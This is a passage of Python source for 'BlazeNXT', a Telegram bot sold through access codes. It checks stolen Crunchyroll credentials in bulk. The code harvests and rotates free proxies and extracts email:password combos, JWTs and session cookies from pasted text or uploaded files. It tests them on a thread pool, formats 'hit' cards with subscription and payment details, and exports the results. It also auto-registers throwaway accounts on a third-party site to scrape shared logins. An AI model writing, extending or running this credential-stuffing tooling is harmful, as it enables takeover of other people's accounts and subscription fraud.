    "https://api.ipify.org?format=json",
    "https://www.google.com/generate_204",
]

LIVE_PROXIES: List[dict] = []
PROXY_LOCK = threading.Lock()
_refresh_busy = threading.Lock()
LAST_PROXY_HARVEST = 0.0
POOL_FILE = DATA_DIR / "proxies_pool.txt"


def proxy_count() -> int:
    with PROXY_LOCK:
        return len(LIVE_PROXIES)


def get_random_proxy() -> Optional[dict]:
    with PROXY_LOCK:
        if LIVE_PROXIES:
            return random.choice(LIVE_PROXIES)
    return None


def harvest_proxies() -> List[str]:
    raw = set()
    s = requests.Session()
    for url in PROXY_SOURCES:
        try:
            r = s.get(url, timeout=10, headers={"User-Agent": BARO_WUA})
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "://" in line:
                        line = line.split("://", 1)[-1]
                    line = line.split("/")[0]
                    if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", line):
                        raw.add(line)
        except requests.RequestException:
            continue
    return list(raw)


def test_one_proxy(proxy_str: str) -> Optional[dict]:
    """proxy_str = host:port. Tries http, then socks5 (if PySocks available)."""
    schemes = ["http"]
    if SOCKS5_OK:
        schemes.append("socks5")
    for scheme in schemes:
        proxies = {"http": f"{scheme}://{proxy_str}", "https": f"{scheme}://{proxy_str}"}
        for url in PROXY_TEST_URLS:
            try:
                r = requests.get(url, proxies=proxies, timeout=PROXY_TEST_TIMEOUT,
                                 headers={"User-Agent": BARO_WUA})
                if r.status_code in (200, 204):
                    return proxies
            except requests.RequestException:
                continue
    return None


def test_proxy_url(proxy_url: str) -> Optional[dict]:
    """proxy_url = full url (scheme://[user:pass@]host:port)."""
    for url in PROXY_TEST_URLS:
        try:
            r = requests.get(url, proxies={"http": proxy_url, "https": proxy_url},
                             timeout=PROXY_TEST_TIMEOUT, headers={"User-Agent": BARO_WUA})
            if r.status_code in (200, 204):
                return {"http": proxy_url, "https": proxy_url}
        except requests.RequestException:
            continue
    return None


def refresh_live_proxies(force: bool = False) -> None:
    global LIVE_PROXIES, LAST_PROXY_HARVEST
    now = time.time()
    with PROXY_LOCK:
        fresh = LIVE_PROXIES and (now - LAST_PROXY_HARVEST) < PROXY_REFRESH_MINUTES * 60
    if not force and fresh:
        return
    if not _refresh_busy.acquire(blocking=False):
        return  # another refresh already running
    try:
        logger.info("Refreshing live proxy pool...")
        candidates = harvest_proxies()
        if not candidates:
            logger.warning("No proxies harvested")
            return
        random.shuffle(candidates)
        to_test = candidates[:PROXY_TEST_SAMPLE]
        live = []
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = {ex.submit(test_one_proxy, p): p for p in to_test}
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                except Exception:
                    continue
                if res:
                    live.append(res)
                    if len(live) >= MAX_PROXIES_TO_KEEP:
                        break
        with PROXY_LOCK:
            LIVE_PROXIES = live
            LAST_PROXY_HARVEST = now
        logger.info("Live proxies ready: %d", len(live))
    finally:
        _refresh_busy.release()


def ensure_proxies() -> None:
    if proxy_count() == 0:
        _load_pool_into_live()
        if proxy_count() == 0:
            refresh_live_proxies(force=True)


def _proxy_loop() -> None:
    while True:
        try:
            refresh_live_proxies(force=False)
        except Exception as e:
            logger.warning("Proxy loop error: %s", e)
        time.sleep(PROXY_REFRESH_MINUTES * 60)


# ---------------- Custom proxy pool (user-added, persistent) ----------------
def pool_load() -> List[str]:
    try:
        if POOL_FILE.exists():
            return [l.strip() for l in POOL_FILE.read_text(encoding="utf-8").splitlines() if l.strip()]
    except OSError:
        pass
    return []


def pool_save(items: List[str]):
    try:
        POOL_FILE.write_text("\n".join(items) + ("\n" if items else ""), encoding="utf-8")
    except OSError as e:
        logger.warning("Pool save failed: %s", e)


def pool_size() -> int:
    return len(pool_load())


def normalize_proxy(line: str) -> Optional[str]:
    """Accepts host:port | user:pass:host:port | scheme://... -> full url."""
    line = (line or "").strip()
    if not line:
        return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    parts = line.split(":")
    if len(parts) == 4 and parts[0] and parts[2] and parts[3].isdigit():
        return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
    if len(parts) == 2 and parts[0] and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    return None


def _merge_live(items: List[dict]):
    with PROXY_LOCK:
        have = {p.get("https") for p in LIVE_PROXIES}
        for p in items:
            if p.get("https") not in have:
                LIVE_PROXIES.append(p)
                have.add(p.get("https"))


def _load_pool_into_live():
    items = pool_load()
    if items:
        _merge_live([{"http": p, "https": p} for p in items])


def add_proxies_to_pool(lines: List[str], auto_check: bool = True):
    """Add user-pasted proxies. Returns (added, invalid)."""
    existing = pool_load()
    have = set(existing)
    added = invalid = 0
    for ln in lines:
        p = normalize_proxy(ln)
        if not p:
            if ln.strip():
                invalid += 1
            continue
        if p in have:
            continue
        existing.append(p)
        have.add(p)
        added += 1
    pool_save(existing)
    if added:
        if auto_check:
            threading.Thread(target=_background_test_pool, daemon=True).start()
        else:
            _merge_live([{"http": p, "https": p} for p in existing])
    return added, invalid


def _background_test_pool():
    """Auto-check: background-test the whole custom pool, keep the live ones.

    Only pool URLs are swapped out — harvested free proxies stay untouched.
    """
    pool_urls = set(pool_load())
    tested = []
    for p in pool_urls:
        res = test_proxy_url(p)
        if res:
            tested.append(res)
    with PROXY_LOCK:
        LIVE_PROXIES[:] = [x for x in LIVE_PROXIES if x.get("https") not in pool_urls]
        _merge_live(tested)
    logger.info("Pool auto-check done: %d live", len(tested))


def clear_pool():
    global LAST_PROXY_HARVEST
    pool_save([])
    with PROXY_LOCK:
        LIVE_PROXIES.clear()
        LAST_PROXY_HARVEST = time.time()  # don't let the loop refill immediately


# ===================== CREDENTIAL EXTRACTION =====================
EMAIL_PASS_RE = re.compile(
    r"([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}):([^\s\"'<>,]{3,128})"
)
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}")
LABELED_TOKEN_RE = re.compile(
    r"(?:access[_-]?token|token|bearer)\s*[:=]\s*[\"']?([A-Za-z0-9_\-.+/=]{20,})", re.I
)
ETP_RT_RE = re.compile(r"etp_rt[\"'\s:=]+([A-Za-z0-9+/=._\-]{16,})", re.I)


def extract_credentials(text: str) -> List[dict]:
    """Pull email:pass lines, JWT/Bearer tokens and etp_rt cookies out of any text."""
    creds: List[dict] = []
    seen = set()

    for m in EMAIL_PASS_RE.finditer(text):
        email, pw = m.group(1), m.group(2)
        key = ("email", email.lower())
        if key not in seen:
            seen.add(key)
            creds.append({"type": "email", "value": email, "password": pw})

    for m in JWT_RE.finditer(text):
        val = m.group(0)
        key = ("token", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "token", "value": val})

    for m in LABELED_TOKEN_RE.finditer(text):
        val = m.group(1).strip().rstrip("\"'")
        if len(val) < 20 or val.lower().startswith(("null", "undefined")):
            continue
        key = ("token", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "token", "value": val})

    for m in ETP_RT_RE.finditer(text):
        val = m.group(1).strip()
        key = ("cookie", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "cookie", "value": val})

    return creds


# ===================== CHECKER ENGINE =====================
def run_check(text: str, reporter=None) -> dict:
    """Thread-pool check of all credentials. Premium counters: hit/free/bad/rate/err/2fa + live feed + cpm."""
    ensure_proxies()
    creds = extract_credentials(text)
    results = {
        "hits": [], "free": [],
        "bad": 0, "rate": 0, "err": 0, "twofa": 0,
        "total": len(creds), "processed": 0,
        "t0": time.time(),
        "live_feed": [],
        "seconds": 0,
        "cpm": 0,
        "elapsed": 0,
    }
    if not creds:
        results["seconds"] = 0
        return results

    lock = threading.Lock()
    px_idx = [0]

    def next_proxy() -> Optional[dict]:
        """Round-robin proxy hand-out (Baron style)."""
        with PROXY_LOCK:
            if not LIVE_PROXIES:
                return None
            with lock:
                p = LIVE_PROXIES[px_idx[0] % len(LIVE_PROXIES)]
                px_idx[0] += 1
            return p

    def worker(cred: dict):
        try:
            r = check_credential(cred, next_proxy())
            return cred, r["st"], r["data"]
        except Exception as e:
            return cred, "err", dict(_blank_data(""), info=_clean_err(e))

    t0 = time.time()
    results["t0"] = t0
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(worker, c): c for c in creds}
        for fut in as_completed(futures):
            cred = futures[fut]
            try:
                orig_cred, st, d = fut.result()
            except Exception as e:
                orig_cred, st, d = cred, "err", dict(_blank_data(""), info=_clean_err(e))
            with lock:
                results["processed"] += 1
                # live feed: keep last 5 checked emails (for premium card)
                try:
                    feed_val = orig_cred.get("value", "") if isinstance(orig_cred, dict) else str(orig_cred)
                    if orig_cred.get("type") == "email":
                        feed_val = orig_cred.get("value", "")
                    else:
                        feed_val = feed_val[:40]
                    results["live_feed"].append(feed_val)
                    if len(results["live_feed"]) > 5:
                        results["live_feed"].pop(0)
                except Exception:
                    pass
                if st == "hit":
                    results["hits"].append({"cred": orig_cred, "data": d, "st": "hit"})
                elif st == "free":
                    results["free"].append({"cred": orig_cred, "data": d, "st": "free"})
                elif st == "bad":
                    results["bad"] += 1
                elif st == "rate":
                    results["rate"] += 1
                elif st == "2fa":
                    results["twofa"] += 1
                else:
                    results["err"] += 1
                # update elapsed/cpm for progress
                elapsed = time.time() - t0
                results["elapsed"] = elapsed
                results["cpm"] = _fmt_cpm(results["processed"], elapsed)
                # throttled live update every 2 checks + interval in reporter
                if reporter and results["processed"] % 2 == 0:
                    try:
                        reporter.update(results)
                    except Exception:
                        pass
    elapsed = time.time() - t0
    results["seconds"] = round(elapsed, 1)
    results["elapsed"] = elapsed
    results["cpm"] = _fmt_cpm(results["processed"], elapsed)
    if reporter:
        try:
            reporter.update(results)
            reporter.wait()
        except Exception:
            pass
    return results


def _cred_value(cred: dict) -> str:
    if cred["type"] == "email":
        return f"{cred['value']}:{cred.get('password', '')}"
    return cred["value"]


def make_export(accounts: List[dict], fmt: str = "txt") -> str:
    fd, path = tempfile.mkstemp(suffix=f".{fmt}", prefix="crunchy_")
    os.close(fd)
    p = Path(path)
    if fmt == "json":
        with open(p, "w", encoding="utf-8") as f:
            json.dump(accounts, f, indent=2, ensure_ascii=False, default=str)
    elif fmt == "csv":
        with open(p, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["combo", "type", "status", "plan", "expiry", "days_left", "country", "streams"])
            for a in accounts:
                d = a.get("data") or {}
                w.writerow([
                    _cred_value(a["cred"]), a["cred"]["type"],
                    "HIT" if a.get("st") == "hit" else "FREE",
                    d.get("plan", ""), d.get("expiry", ""), d.get("days_left", ""),
                    d.get("country_name", ""), d.get("streams", ""),
                ])
    else:
        with open(p, "w", encoding="utf-8") as f:
            for a in accounts:
                d = a.get("data") or {}
                status = "HIT" if a.get("st") == "hit" else "FREE"
                flag = flag_emoji(d.get("cc"))
                f.write(
                    f"{_cred_value(a['cred'])} | {status} | Plan: {d.get('plan') or 'Premium'} | "
                    f"Expiry: {d.get('expiry') or '?'} | Days: {d.get('days_left') or '?'} | "
                    f"Country: {flag + ' ' if flag else ''}{d.get('country_name') or '?'} | "
                    f"Streams: {d.get('streams') or '?'}\n"
                )
    return str(p)


# ===================== OXAAM SCRAPER (from cc2.py, bug-fixed) =====================
OXAAM_BASE = "https://www.oxaam.com/"
OXAAM_FREE = "https://www.oxaam.com/freeservice.php"


def _oxaam_headers() -> dict:
    return {
        "User-Agent": BARO_WUA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.oxaam.com",
        "Referer": "https://www.oxaam.com/",
    }


def _find_password(block: str) -> Optional[str]:
    m = re.search(r"[Pp]ass(?:word)?\s*[:=]\s*([^\s<>\"'`,;]{6,})", block)
    if m:
        return m.group(1)
    m = re.search(r"\"password\"\s*:\s*\"([^\"]{6,})\"", block)
    if m:
        return m.group(1)
    return None


def parse_oxaam(html: str):
    """Robust credential extraction — no NameErrors, no magic line numbers."""
    if BeautifulSoup is not None:
        try:
            soup = BeautifulSoup(html, "html.parser")
            for details in soup.find_all("details"):
                summary = details.find("summary")
                title = summary.get_text(" ", strip=True) if summary else details.get_text(" ", strip=True)
                if not re.search(r"crunch|krunsh", title, re.I):
                    continue
                block = str(details)
                em = re.search(r"[\w.\-]+@[\w.\-]+\.\w+", block)
                if not em:
                    continue
                email = em.group(0)
                pw = _find_password(block)
                if pw:
                    return email, pw
        except Exception as e:
            logger.warning("Oxaam details-parse failed: %s", e)
    m = EMAIL_PASS_RE.search(html)
    if m:
        return m.group(1), m.group(2)
    return None, None


def oxaam_fetch(proxy: dict | None = None):
    """Register on the site and pull a fresh Crunchyroll credential. Returns (email, password)."""
    # Try both www and non-www, with and without proxy, with retries
    import time as _t
    bases = [OXAAM_BASE, OXAAM_BASE.replace("www.", ""), "https://oxaam.com/", "https://www.oxaam.com/"]
    # deduplicate
    bases = list(dict.fromkeys(bases))
    for base in bases:
        free_url = base.rstrip("/") + "/freeservice.php"
        dash_url = base.rstrip("/") + "/dashboard.php"
        for attempt in range(2):
            name = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
            email = f"{name}_{random.randint(100, 999)}@gmail.com"
            password = (
                "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
                + str(random.randint(100, 999))
                + "@"
                + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4))
            )
            data = {
                "name": name,
                "email": email,
                "phone": "9" + "".join(random.choices("0123456789", k=9)),
                "password": password,
                "country": "India",
            }
            try:
                s = requests.Session()
                # Oxaam needs cookies — GET base first to init session
                try:
                    s.get(base, headers=_oxaam_headers(), timeout=20, proxies=proxy)
                except Exception:
                    pass
                # POST register (some versions use /register.php, try both)
                resp = None
                for reg_url in [base, base.rstrip("/") + "/register.php", base.rstrip("/") + "/signup.php"]:
                    try:
                        resp = s.post(reg_url, data=data, headers=_oxaam_headers(), timeout=30, proxies=proxy)
                        if resp.status_code in (200, 302):
                            break
                    except requests.RequestException:
                        continue
                # slight delay
                _t.sleep(0.8)
                # GET freeservice
                r = s.get(free_url, headers={**_oxaam_headers(), "Referer": dash_url}, timeout=30, proxies=proxy)
                if r.status_code != 200:
                    logger.warning("Oxaam GET %s -> %s", free_url, r.status_code)
                    continue
                html = r.text or ""
                # Debug: if site returns login page or captcha, log snippet
                if len(html) < 500:
                    logger.warning("Oxaam short html %s: %s", free_url, html[:500])
                # Try to parse
                em, pw = parse_oxaam(html)
                if em and pw:
                    logger.info("Oxaam hit via %s (attempt %s)", base, attempt+1)
                    return em, pw
                # Fallback: search any email:pass in page even without details
                if "crunch" in html.lower() or "@" in html:
                    # Log first 2k for debug
                    logger.info("Oxaam no hit but html snippet: %s", html[:2000].replace("\n"," "))
                # Retry with different base
            except requests.RequestException as e:
                logger.warning("Oxaam fetch error %s (%s): %s", base, attempt+1, e)
                # try without proxy on second attempt
                if proxy and attempt == 0:
                    proxy = None
                    continue
            except Exception as e:
                logger.warning("Oxaam unexpected %s: %s", base, e)
            _t.sleep(1.2)
    return None, None



# ===================== PERSISTENT STORE (codes + grants + settings) =====================
class Store:
    def __init__(self, path: Path):
        self.path = path
        self.lock = threading.RLock()
        self.codes: Dict[str, dict] = {}
        self.users: Dict[str, dict] = {}
        self.settings: Dict[str, object] = {}
        self._load()

    def _load(self):
        try:
            if self.path.exists():
                data = json.loads(self.path.read_text(encoding="utf-8"))
                self.codes = data.get("codes", {})
                self.users = data.get("users", {})
                self.settings = data.get("settings", {})
        except Exception as e:
            logger.warning("Store load failed: %s", e)

    def save(self):
        with self.lock:
            try:
                tmp = self.path.with_suffix(".tmp")
                tmp.write_text(
                    json.dumps({"codes": self.codes, "users": self.users, "settings": self.settings},
                               indent=2),
                    encoding="utf-8",
                )
                os.replace(tmp, self.path)
            except Exception as e:
                logger.warning("Store save failed: %s", e)

    def get_setting(self, key, default=None):
        with self.lock:
            return self.settings.get(key, default)

    def set_setting(self, key, value):
        with self.lock:
            self.settings[key] = value
            self.save()

    def has_access(self, uid: int):
        with self.lock:
            if uid in ADMIN_IDS:
                return True, now_utc()
            info = self.users.get(str(uid))
            if info:
                exp = parse_iso(info.get("expiry"))
                if exp and exp > now_utc():
                    return True, exp
                self.users.pop(str(uid), None)
                self.save()
            return False, None

    def redeem(self, code: str, uid: int):
        """Returns an expiry datetime on success, or 'invalid' | 'used' | 'expired'."""
        code = (code or "").strip().upper()
        with self.lock:
            data = self.codes.get(code)
            if not data:
                return "invalid"
            if data.get("used_by") is not None:
                return "used"
            exp = parse_iso(data.get("expiry"))
            if not exp or exp < now_utc():
                self.codes.pop(code, None)
                self.save()
                return "expired"
            data["used_by"] = uid
            self.users[str(uid)] = {
                "expiry": data.get("expiry"),
                "premium_only": PREMIUM_ONLY_DEFAULT,
            }
            self.save()
            return exp

    def add_code(self, code: str, hours: int) -> datetime:
        exp = now_utc() + timedelta(hours=hours)
        with self.lock:
            self.codes[code] = {"expiry": exp.isoformat(), "used_by": None}
            self.save()
        return exp

    def set_premium_only(self, uid: int, val: bool):
        with self.lock:
            info = self.users.setdefault(str(uid), {})
            info["premium_only"] = bool(val)
            self.save()

    def get_premium_only(self, uid: int) -> bool:
        with self.lock:
            info = self.users.get(str(uid))
            if info and "premium_only" in info:
                return bool(info["premium_only"])
        return PREMIUM_ONLY_DEFAULT

    def active_user_count(self) -> int:
        with self.lock:
            now = now_utc()
            return sum(
                1 for d in self.users.values()
                if (parse_iso(d.get("expiry")) or datetime.min.replace(tzinfo=timezone.utc)) > now
            )


STORE: Optional[Store] = None


# ===================== PROGRESS (thread-safe, BlazeNXT PREMIUM bar) =====================
def _bar(pct: int, width: int = 20) -> str:
    filled = int(pct / 100 * width)
    return "█" * filled + "░" * (width - filled)


def _live_feed_block(res: dict) -> str:
    feed = res.get("live_feed") or []
    if not feed:
        return "  <i>—</i>"
    # show last 3
    last = feed[-3:]
    return "\n".join(f"  {esc(x)}" for x in last)


def progress_text(res: dict) -> str:
    total = res.get("total") or 0
    processed = res.get("processed", 0)
    # Premium: show one decimal for <10% to match BlazeNXT screenshot 0.6%
    raw_pct = (processed / total * 100) if total else 0
    if raw_pct < 10 and raw_pct != 0:
        pct_str = f"{raw_pct:.1f}"
        pct = int(raw_pct)  # for bar
    else:
        pct_str = str(int(raw_pct))
        pct = int(raw_pct)
    # CPM / elapsed / ETA premium
    elapsed = res.get("elapsed") or (time.time() - res.get("t0", time.time())) if res.get("t0") else 0
    cpm = res.get("cpm") if res.get("cpm") is not None else _fmt_cpm(processed, elapsed)
    eta = _fmt_eta(total, processed, cpm)
    elapsed_s = _fmt_duration(elapsed) if elapsed else "0m 0s"
    twofa = res.get("twofa", 0)
    # Keep legacy first two lines EXACT for backward-compat tests, then add premium block
    legacy = (
        f"⏳ Crunchyroll {pct_str}% [{_bar(pct)}] ({processed}/{total})\n"
        f"✅ Hits: {len(res.get('hits', []))} | 🆓 Free: {len(res.get('free', []))} | "
        f"❌ Bad: {res.get('bad',0)} | ⏳ Rate: {res.get('rate',0)} | ⚠️ Errors: {res.get('err',0)}"
    )
    # Detailed: success rate
    success_rate = (len(res.get('hits', [])) / processed * 100) if processed else 0
    premium = (
        f"📈 <b>CRUNCHYROLL Scan — Live</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{legacy}\n"
        f"🔐 2FA: <code>{twofa}</code> | 🌐 Proxies: <code>{proxy_count()}</code> | ✅ Rate: <code>{success_rate:.1f}%</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📈 <code>{cpm} cpm</code>  🕒 <code>{elapsed_s}</code>  ⏳ ETA <code>{eta}</code>\n"
        f"• Checked: <code>{processed}/{total}</code>  • {pct_str}% • ✅ <code>{len(res.get('hits', []))}</code> hits\n"
        f"📡 <b>Live feed:</b>\n"
        f"{_live_feed_block(res)}"
    )
    return premium


class ProgressReporter:
    """Updates a Telegram message from worker threads without blocking."""

    def __init__(self, message, loop: asyncio.AbstractEventLoop, interval: float = 1.8):
        self.message = message
        self.loop = loop
        self.interval = interval
        self.last = 0.0
        self.tasks: List = []

    def update(self, res: dict):
        now = time.time()
        if now - self.last < self.interval:
            return
        self.last = now
        try:
            fut = asyncio.run_coroutine_threadsafe(self._edit(progress_text(res)), self.loop)
            self.tasks.append(fut)
        except Exception:
            pass

    async def _edit(self, text: str):
        try:
            await self.message.edit_text(text, parse_mode=ParseMode.HTML)
        except BadRequest:  # "message is not modified" etc. — safe to ignore
            pass
        except Exception:
            pass

    def wait(self):
        for t in self.tasks:
            try:
                t.result(timeout=10)
            except Exception:
                pass
        self.tasks.clear()


# ===================== FORMATTING — BlazeNXT PREMIUM =====================
def access_denied_html() -> str:
    return (
        "⛔ <b>Access Denied</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "You don't have access to this bot.\n"
        f"Get a code from the owner: <code>{esc(OWNER_USERNAME)}</code>\n\n"
        "🎫 Press the button below and paste your code.\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Owner: <code>{esc(OWNER_USERNAME)}</code>"
    )


def hit_card(entry: dict) -> str:
    """⭐ Full detail card for one hit — BlazeNXT DETAILED style."""
    cred, d = entry["cred"], entry.get("data") or {}
    L = ["⭐ <b>CRUNCHYROLL HIT!</b>", "━━━━━━━━━━━━━━━━━━━━━"]
    if cred["type"] == "email":
        L.append(f"📧 Email: <code>{esc(cred['value'])}</code>")
        L.append(f"🔑 Password: <code>{esc(cred.get('password', ''))}</code>")
    else:
        L.append(f"🔑 {cred['type'].title()}: <code>{esc(cred['value'][:60])}</code>")
    L.append("━━━━━━━━━━━━━━━━━━━━━")
    # Core plan
    L.append(f"• Plan: <code>{esc(d.get('plan') or 'Premium')}</code>  • Premium: ✅")
    L.append(f"• Streams: <code>{esc(d.get('streams') or 'N/A')}</code>  • SKU: <code>{esc(d.get('sku') or 'N/A')}</code>")
    L.append(f"• Plan Type: <code>{esc(d.get('plan_type') or 'N/A')}</code>  • Trial: {'✅' if d.get('trial') else '❌'}")
    # Billing & expiry - detailed
    L.append(f"• Expiry: <code>{esc(d.get('expiry') or d.get('next_renewal') or 'N/A')}</code>  • Days Left: <code>{esc(d.get('days_left') or 'N/A')}</code>")
    L.append(f"• Next Renewal: <code>{esc(d.get('next_renewal') or d.get('expiry') or 'N/A')}</code>")
    L.append(f"• Auto Renew: {'✅' if d.get('renew') else '❌'}  • Billing: <code>{esc(d.get('duration') or d.get('billing_cycle') or 'N/A')}</code>")
    price = (str(d.get("price") or "0") + (" " + d["currency"] if d.get("currency") else ""))
    L.append(f"• Price: <code>{esc(price.strip())}</code>  • Currency: <code>{esc(d.get('currency') or 'N/A')}</code>")
    L.append(f"• Payment: <code>{esc(d.get('payment') or d.get('payment_method') or 'N/A')}</code>")
    # Account details
    L.append("━━━━━━━━━━━━━━━━━━━━━")
    L.append(f"• Email Verified: {'✅' if d.get('verified') else '❌'}  • Created: <code>{esc(d.get('created') or d.get('start_date') or 'N/A')}</code>")
    if d.get("account_id"):
        L.append(f"• Account ID: <code>{esc(d.get('account_id'))}</code>")
    if d.get("external_id"):
        L.append(f"• External ID: <code>{esc(d.get('external_id'))}</code>")
    if d.get("sub_id"):
        L.append(f"• Sub ID: <code>{esc(d.get('sub_id'))}</code>  • Status: <code>{esc(d.get('sub_status') or 'active')}</code>")
    country = " ".join(x for x in (flag_emoji(d.get("cc")), esc(d.get("country_name"))) if x)
    L.append(f"• Country: {country or 'N/A'}  • CC: <code>{esc(d.get('cc') or 'N/A')}</code>")
    if d.get("user") and d["user"] != (cred.get("value", "").split("@")[0]):
        L.append(f"• Profile: <code>{esc(d.get('user'))}</code>")
    # Meta
    L.append(f"• Checked At: <code>{esc(fmt_dt(now_utc()))}</code>")
    if d.get("proxy_used"):
        L.append(f"• Proxy: <code>{esc(d.get('proxy_used'))}</code>")
    if d.get("info"):
        L.append(f"• Info: <code>{esc(d.get('info'))}</code>")
    L.append("━━━━━━━━━━━━━━━━━━━━━")
    L.append("🔥 <b>BlazeNXT</b>")
    return "\n".join(L)


def summary_text(res: dict) -> str:
    # Keep legacy lines for compat, wrap in premium header/footer
    hits = len(res.get('hits', []))
    free = len(res.get('free', []))
    bad = res.get('bad', 0)
    rate = res.get('rate', 0)
    err = res.get('err', 0)
    twofa = res.get('twofa', 0)
    total = res.get('total', 0)
    processed = res.get('processed', 0)
    sec = res.get('seconds', '?')
    cpm = res.get('cpm', 0)
    elapsed = res.get('elapsed', 0)
    if not cpm and elapsed:
        cpm = _fmt_cpm(processed, elapsed)
    # legacy block (must stay exactly for tests)
    legacy = (
        f"📊 Total: <code>{total}</code> | Processed: <code>{processed}</code>\n"
        f"✅ Hits: <code>{hits}</code> | 🆓 Free: <code>{free}</code> | "
        f"❌ Bad: <code>{bad}</code>\n"
        f"⏳ Rate: <code>{rate}</code> | ⚠️ Errors: <code>{err}</code>\n"
        f"⏱ Time: <code>{sec}s</code> | 🌐 Live Proxies: <code>{proxy_count()}</code>"
    )
    # premium wrapper - BlazeNXT clean (no tagline if user chose no_tagline, but keep BlazeNXT branding)
    extra = f"🔐 2FA: <code>{twofa}</code> | 📈 Avg: <code>{cpm} cpm</code>" if twofa or cpm else ""
    extra_block = f"{extra}\n" if extra else ""
    # Detailed breakdown
    detailed = ""
    if res.get("hits"):
        # Plan breakdown
        from collections import Counter
        plans = Counter((h.get("data") or {}).get("plan") or "Premium" for h in res.get("hits", []))
        plan_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in plans.items())
        # Country breakdown (top 3)
        ccs = Counter((h.get("data") or {}).get("country_name") or (h.get("data") or {}).get("cc") or "Unknown" for h in res.get("hits", []))
        cc_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in ccs.most_common(3))
        # Success rate
        total = res.get("total", 0) or 1
        rate = len(res.get("hits", [])) / total * 100
        detailed = (
            f"📊 Plans: {plan_line}\n"
            f"🌍 Countries: {cc_line}\n"
            f"✅ Success: <code>{rate:.1f}%</code> • ⏱ Avg: <code>{res.get('cpm',0)} cpm</code>\n"
        )
    return (
        "✅ <b>CRUNCHYROLL Scan — Complete!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"{legacy}\n"
        f"{extra_block}"
        f"{detailed}"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 <b>BlazeNXT</b>"
    )


def status_text() -> str:
    ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
    return (
        "📊 <b>BlazeNXT — Bot Status</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Owner: <code>{esc(OWNER_USERNAME)}</code>\n"
        f"🌐 Live Proxies: <code>{proxy_count()}</code> | Pool: <code>{pool_size()}</code>\n"
        f"⚙️ Auto-Check Proxies: <code>{'ON' if ac else 'OFF'}</code>\n"
        f"👥 Active Users: <code>{STORE.active_user_count() if STORE else 0}</code>\n"
        f"🧵 Threads: <code>{THREADS}</code>\n"
        f"🔁 Proxy Refresh: <code>{PROXY_REFRESH_MINUTES} min</code>\n"
        f"⏱ Uptime: <code>{uptime()}</code>\n"
        f"✅ Checks This Session: <code>{CHECKS_DONE}</code>\n"
        f"🧩 SOCKS5: <code>{'Yes' if SOCKS5_OK else 'No (missing pysocks)'}</code>\n"
        f"💎 Default Mode: <code>{'Premium Only' if PREMIUM_ONLY_DEFAULT else 'All Working'}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 <b>BlazeNXT</b>"
    )


def help_text() -> str:
    return (
        "📖 <b>BlazeNXT — How To Use</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "💎 <b>Check Account</b> – paste <code>EMAIL:PASS</code> lines (1 or many)\n"
        "📂 <b>Check File</b> – send <code>.txt / .log / .json / .csv</code>\n"
        "🎫 <b>Redeem</b> – paste an access code from the owner\n"
        "🎛 <b>Output Mode</b> – Premium only / All working\n"
        "✅ <b>My Access</b> – when your access expires\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "👑 <b>Owner panel adds:</b>\n"
        "🔑 Generate codes (24 / 48 / 72h)\n"
        "📥 Add Proxies · 🧹 Clear Pool · ⚙️ Auto-Check\n"
        "📊 Live status · 📡 Proxy refresh\n"
        "🤖 Oxaam auto-fetch · 📺 TV activation\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 <b>BlazeNXT</b>\n"
        f"👤 Owner: <code>{esc(OWNER_USERNAME)}</code>"
    )


def welcome_premium_text(uid: int, name: str) -> str:
    has, exp = STORE.has_access(uid) if STORE else (False, None)
    if is_admin(uid):
        access_line = "👑 <b>Owner</b> • Unlimited"
    elif has and exp:
        access_line = f"🔑 Access: <code>Active • Expires {fmt_dt(exp)}</code>"
    else:
        access_line = "⛔ <b>Access Required</b>"
    return (
        "🔥 <b>BlazeNXT</b> — <i>CRUNCHYROLL CHECKER</i> 🎀\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 Hello, <code>{esc(name)}</code>!\n"
        f"🆔 <code>{uid}</code>  •  {access_line}\n"
        f"🌐 Proxies: <code>{proxy_count()} live</code> • Pool: <code>{pool_size()}</code>\n"
        f"👥 Users: <code>{STORE.active_user_count() if STORE else 0}</code> • 🧵 <code>{THREADS} threads</code>\n"
        f"⏱ Uptime: <code>{uptime()}</code> • ✅ Checks: <code>{CHECKS_DONE}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
